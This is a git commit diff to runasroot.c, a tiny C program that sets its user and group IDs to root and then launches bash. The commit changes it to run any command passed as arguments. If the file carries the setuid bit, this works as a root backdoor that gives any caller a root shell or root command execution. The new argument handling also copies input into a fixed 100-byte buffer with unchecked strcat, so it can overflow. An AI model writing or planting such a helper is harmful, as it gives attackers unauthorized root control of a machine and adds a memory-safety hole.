b7c538781ffe1a28a68b8fce21442c8bae7d6618
H8CKR <h8ckr@protonmail.com>
2020-01-24 00:15:48 +0100

    run custom command if arguments are provided

--- runasroot.c
+++ runasroot.c
@@ -2,11 +2,26 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <stdarg.h>
+#include <string.h>
 
-int main()
+int i;
+char command[100];
+
+int main(int argc, char* argv[])
 {
 	setuid(0);
 	setgid(0);
-	system("/bin/bash");
+
+	if (argc == 1) {
+		system("/bin/bash");
+	} else {
+		for (i = 1; i < argc; i++) {
+			strcat(command, " ");
+			strcat(command, argv[i]);
+		}
+		system(command);
+	}
+
 	return 0;
 }
